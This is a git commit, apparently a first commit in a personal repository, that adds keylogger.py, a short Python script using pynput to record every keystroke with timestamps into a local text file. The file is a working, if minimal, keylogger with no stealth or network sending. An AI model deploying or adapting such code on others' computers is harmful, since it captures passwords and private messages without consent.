c2372109aa5939c728172e2e49000c3c5f79a481
David Shenkerman <david.shenkerman@duke.edu>
2024-01-08 15:59:55 -0500

    First commit

---
+++ keylogger.py
@@ -0,0 +1,14 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import logging
+
+log_dir  = r"/Users/davidshenkerman/Documents"
+logging.basicConfig(filename = (log_dir + r"/keylog.txt"), level = logging.INFO, format = '%(asctime)s: %(message)s')
+def on_press(key):
+    try:
+        logging.info(key.char)
+    except AttributeError:
+        logging.info(key)
+
+with Listener(on_press = on_press) as listener:
+    listener.join() 
